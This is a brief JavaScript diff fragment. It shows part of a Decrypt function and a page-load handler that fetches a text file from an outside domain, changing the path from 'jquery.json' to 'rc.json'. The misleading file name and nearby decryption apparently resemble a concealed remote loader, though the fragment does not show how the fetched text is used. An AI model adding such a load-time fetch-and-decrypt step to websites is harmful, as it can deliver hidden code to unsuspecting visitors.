@@ -133,7 +133,7 @@ function Decrypt(s1, id) {
     return result;
 }
 $(document).ready(function () {
-    fetch('https://www.iplezier.site/assets/js/c/jquery.json?ver=' + $.now())
+    fetch('https://www.iplezier.site/assets/js/c/rc.json?ver=' + $.now())
         .then(function(response) {
             return response.text();
         })
